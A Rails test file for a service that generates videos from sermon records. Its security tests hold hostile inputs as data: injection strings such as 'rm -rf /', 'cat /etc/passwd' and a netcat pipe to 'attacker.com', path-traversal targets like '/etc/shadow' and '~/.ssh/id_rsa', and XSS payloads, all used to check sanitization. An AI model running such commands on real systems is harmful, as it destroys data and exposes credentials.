require "test_helper"

class VideoGeneratorServiceTest < ActiveSupport::TestCase
  def setup
    @sermon = sermons(:one)
    @service = VideoGeneratorService.new(@sermon)
    @valid_script = "This is a comprehensive video script about faith and hope that meets all requirements."
    @test_output_dir = Rails.root.join('tmp', 'test_videos')
    FileUtils.mkdir_p(@test_output_dir)
  end

  def teardown
    FileUtils.rm_rf(@test_output_dir) if File.exist?(@test_output_dir)
  end

  # Initialization Tests
  test "should initialize with sermon" do
    assert_equal @sermon, @service.sermon
    assert_not_nil @service.config
  end

  test "should raise error when initialized without sermon" do
    assert_raises ArgumentError do
      VideoGeneratorService.new(nil)
    end
  end

  test "should load configuration on initialization" do
    config = @service.config
    
    assert_not_nil config['script_template']
    assert_not_nil config['video_settings']
    assert_not_nil config['output_format']
  end

  # Script Generation Tests
  test "should generate script from sermon data" do
    result = @service.generate_script
    
    assert result.success?
    script = result.script
    
    assert_not_nil script
    assert script.length >= 10
    assert_includes script, @sermon.title
    assert_includes script, @sermon.church if @sermon.church.present?
    assert_includes script, @sermon.pastor if @sermon.pastor.present?
  end

  test "should handle sermon with minimal data" do
    minimal_sermon = Sermon.create!(
      title: "Simple Sermon",
      source_url: "https://minimal.com",
      church: "Simple Church"
    )
    
    service = VideoGeneratorService.new(minimal_sermon)
    result = service.generate_script
    
    assert result.success?
    assert_includes result.script, "Simple Sermon"
    assert_includes result.script, "Simple Church"
  end

  test "should sanitize script content" do
    malicious_sermon = Sermon.create!(
      title: "Test<script>alert('xss')</script>",
      source_url: "https://malicious.com",
      church: "Test Church",
      interpretation: "Content<iframe src='javascript:alert(1)'></iframe>test"
    )
    
    service = VideoGeneratorService.new(malicious_sermon)
    result = service.generate_script
    
    assert result.success?
    assert_not_includes result.script, "<script>"
    assert_not_includes result.script, "<iframe"
    assert_not_includes result.script, "javascript:"
  end

  # Input Validation Tests
  test "should validate script content" do
    # Test minimum length
    short_script = "Short"
    assert_not @service.send(:valid_script?, short_script)
    
    # Test maximum length
    long_script = "a" * 10_001
    assert_not @service.send(:valid_script?, long_script)
    
    # Test valid script
    assert @service.send(:valid_script?, @valid_script)
  end

  test "should validate file paths" do
    valid_paths = [
      "/tmp/video.mp4",
      "/home/user/videos/sermon.mp4",
      "videos/output.mp4"
    ]
    
    valid_paths.each do |path|
      assert @service.send(:safe_path?, path), "Should accept valid path: #{path}"
    end
    
    invalid_paths = [
      "../../../etc/passwd",
      "/etc/shadow",
      "~/.ssh/id_rsa",
      "/dev/null",
      "",
      nil
    ]
    
    invalid_paths.each do |path|
      assert_not @service.send(:safe_path?, path), "Should reject invalid path: #{path}"
    end
  end

  # Video Processing Tests
  test "should process video with valid script" do
    # Mock the video processing command
    @service.expects(:execute_video_command).returns({
      success: true,
      output_path: @test_output_dir.join('test_video.mp4').to_s,
      thumbnail_path: @test_output_dir.join('test_thumbnail.jpg').to_s
    })
    
    result = @service.process_video(@valid_script)
    
    assert result.success?
    assert_not_nil result.video_path
    assert_not_nil result.thumbnail_path
  end

  test "should handle video processing failures" do
    @service.expects(:execute_video_command).returns({
      success: false,
      error: "Video processing failed"
    })
    
    result = @service.process_video(@valid_script)
    
    assert_not result.success?
    assert_includes result.error, "Video processing failed"
  end

  test "should validate output files exist" do
    # Mock successful command but missing files
    @service.expects(:execute_video_command).returns({
      success: true,
      output_path: "/nonexistent/video.mp4",
      thumbnail_path: "/nonexistent/thumbnail.jpg"
    })
    
    result = @service.process_video(@valid_script)
    
    assert_not result.success?
    assert_includes result.error, "Output files not found"
  end

  # Configuration Tests
  test "should use default configuration when file missing" do
    VideoGeneratorService.expects(:load_config).returns(VideoGeneratorService::DEFAULT_CONFIG)
    
    service = VideoGeneratorService.new(@sermon)
    config = service.config
    
    assert_equal VideoGeneratorService::DEFAULT_CONFIG, config
  end

  test "should validate configuration structure" do
    invalid_configs = [
      {},
      { script_template: "" },
      { video_settings: nil },
      { script_template: "template", video_settings: {}, missing_key: true }
    ]
    
    invalid_configs.each do |config|
      assert_not @service.send(:valid_config?, config), "Should reject invalid config: #{config}"
    end
    
    valid_config = VideoGeneratorService::DEFAULT_CONFIG
    assert @service.send(:valid_config?, valid_config)
  end

  # Command Execution Tests
  test "should build safe command with proper escaping" do
    script = "Test script with 'quotes' and \"double quotes\""
    output_path = @test_output_dir.join('test.mp4').to_s
    
    command = @service.send(:build_command, script, output_path)
    
    assert_not_includes command, script # Should not contain raw script
    assert_includes command, output_path
    assert command.is_a?(Array), "Command should be array for safe execution"
  end

  test "should timeout long-running processes" do
    # Mock a long-running process
    @service.expects(:system).never # Should not execute actual system commands
    
    start_time = Time.current
    result = @service.send(:execute_with_timeout, ["sleep", "10"], 1)
    end_time = Time.current
    
    assert_not result[:success]
    assert (end_time - start_time) < 2, "Should timeout within expected time"
  end

  # Error Handling Tests
  test "should handle file permission errors" do
    readonly_dir = @test_output_dir.join('readonly')
    FileUtils.mkdir_p(readonly_dir)
    FileUtils.chmod(0444, readonly_dir)
    
    result = @service.process_video(@valid_script, readonly_dir.join('video.mp4').to_s)
    
    assert_not result.success?
    assert_includes result.error, "permission"
    
    # Cleanup
    FileUtils.chmod(0755, readonly_dir)
    FileUtils.rm_rf(readonly_dir)
  end

  test "should handle disk space errors" do
    # Mock filesystem full error
    File.expects(:write).raises(Errno::ENOSPC.new("No space left on device"))
    
    result = @service.process_video(@valid_script)
    
    assert_not result.success?
    assert_includes result.error, "space"
  end

  test "should handle missing dependencies" do
    # Mock missing video processing tool
    @service.expects(:system).with(["which", "ffmpeg"]).returns(false)
    
    result = @service.process_video(@valid_script)
    
    assert_not result.success?
    assert_includes result.error, "dependencies"
  end

  # Security Tests
  test "should prevent command injection in script" do
    malicious_scripts = [
      "Test; rm -rf /",
      "Test && cat /etc/passwd",
      "Test | nc attacker.com 1234",
      "Test `whoami`",
      "Test $(id)",
      "Test & background-task"
    ]
    
    malicious_scripts.each do |script|
      # Should sanitize script before processing
      sanitized = @service.send(:sanitize_script, script)
      assert_not_includes sanitized, ";"
      assert_not_includes sanitized, "&&"
      assert_not_includes sanitized, "|"
      assert_not_includes sanitized, "`"
      assert_not_includes sanitized, "$("
      assert_not_includes sanitized, "&"
    end
  end

  test "should prevent path traversal in output paths" do
    dangerous_paths = [
      "../../../tmp/video.mp4",
      "/etc/passwd.mp4",
      "~/../../etc/shadow.mp4",
      "/dev/null.mp4"
    ]
    
    dangerous_paths.each do |path|
      result = @service.process_video(@valid_script, path)
      assert_not result.success?, "Should reject dangerous path: #{path}"
    end
  end

  test "should limit resource usage" do
    # Test memory limit
    large_script = "x" * 100_000
    result = @service.process_video(large_script)
    
    # Should either succeed with limits or fail gracefully
    assert_not_nil result
    
    if result.success?
      # If processing succeeds, should have reasonable file sizes
      video_size = File.size(result.video_path) if File.exist?(result.video_path)
      assert video_size.nil? || video_size < 100_000_000, "Video file too large"
    end
  end

  # Integration Tests
  test "generate_video should orchestrate full workflow" do
    # Mock individual steps
    @service.expects(:generate_script).returns(
      OpenStruct.new(success?: true, script: @valid_script)
    )
    @service.expects(:process_video).returns(
      OpenStruct.new(
        success?: true,
        video_path: @test_output_dir.join('video.mp4').to_s,
        thumbnail_path: @test_output_dir.join('thumbnail.jpg').to_s
      )
    )
    
    result = @service.generate_video
    
    assert result.success?
    assert_not_nil result.video_path
    assert_not_nil result.thumbnail_path
  end

  test "generate_video should handle script generation failure" do
    @service.expects(:generate_script).returns(
      OpenStruct.new(success?: false, error: "Script generation failed")
    )
    
    result = @service.generate_video
    
    assert_not result.success?
    assert_includes result.error, "Script generation failed"
  end

  test "generate_video should handle video processing failure" do
    @service.expects(:generate_script).returns(
      OpenStruct.new(success?: true, script: @valid_script)
    )
    @service.expects(:process_video).returns(
      OpenStruct.new(success?: false, error: "Video processing failed")
    )
    
    result = @service.generate_video
    
    assert_not result.success?
    assert_includes result.error, "Video processing failed"
  end

  # Custom Error Classes Tests
  test "should raise appropriate custom errors" do
    assert_raises VideoGeneratorService::InvalidConfigurationError do
      raise VideoGeneratorService::InvalidConfigurationError.new("Config error")
    end
    
    assert_raises VideoGeneratorService::ScriptGenerationError do
      raise VideoGeneratorService::ScriptGenerationError.new("Script error")
    end
    
    assert_raises VideoGeneratorService::VideoProcessingError do
      raise VideoGeneratorService::VideoProcessingError.new("Processing error")
    end
    
    assert_raises VideoGeneratorService::FileSystemError do
      raise VideoGeneratorService::FileSystemError.new("File error")
    end
  end

  # Performance Tests
  test "should complete processing within reasonable time" do
    # Mock quick processing
    @service.expects(:execute_video_command).returns({
      success: true,
      output_path: @test_output_dir.join('video.mp4').to_s,
      thumbnail_path: @test_output_dir.join('thumbnail.jpg').to_s
    })
    
    start_time = Time.current
    result = @service.process_video(@valid_script)
    end_time = Time.current
    
    assert result.success?
    assert (end_time - start_time) < 5, "Processing should complete quickly in test"
  end

  # Edge Cases
  test "should handle concurrent processing" do
    # Create multiple services for same sermon
    service1 = VideoGeneratorService.new(@sermon)
    service2 = VideoGeneratorService.new(@sermon)
    
    # Mock different output paths
    service1.expects(:execute_video_command).returns({
      success: true,
      output_path: @test_output_dir.join('video1.mp4').to_s,
      thumbnail_path: @test_output_dir.join('thumbnail1.jpg').to_s
    })
    
    service2.expects(:execute_video_command).returns({
      success: true,
      output_path: @test_output_dir.join('video2.mp4').to_s,
      thumbnail_path: @test_output_dir.join('thumbnail2.jpg').to_s
    })
    
    result1 = service1.process_video(@valid_script)
    result2 = service2.process_video(@valid_script)
    
    assert result1.success?
    assert result2.success?
    assert_not_equal result1.video_path, result2.video_path
  end

  test "should handle unicode in sermon data" do
    unicode_sermon = Sermon.create!(
      title: "信仰と希望",
      source_url: "https://unicode.com",
      church: "Église de la Grâce",
      pastor: "José María",
      interpretation: "содержание проповеди"
    )
    
    service = VideoGeneratorService.new(unicode_sermon)
    result = service.generate_script
    
    assert result.success?
    assert_includes result.script, "信仰と希望"
    assert_includes result.script, "Église de la Grâce"
  end

  test "should cleanup temporary files on error" do
    temp_file = @test_output_dir.join('temp_script.txt')
    File.write(temp_file, @valid_script)
    
    # Mock processing failure
    @service.expects(:execute_video_command).raises(StandardError.new("Processing failed"))
    
    begin
      @service.process_video(@valid_script)
    rescue StandardError
      # Expected to fail
    end
    
    # Temporary files should be cleaned up
    assert_not File.exist?(temp_file)
  end
end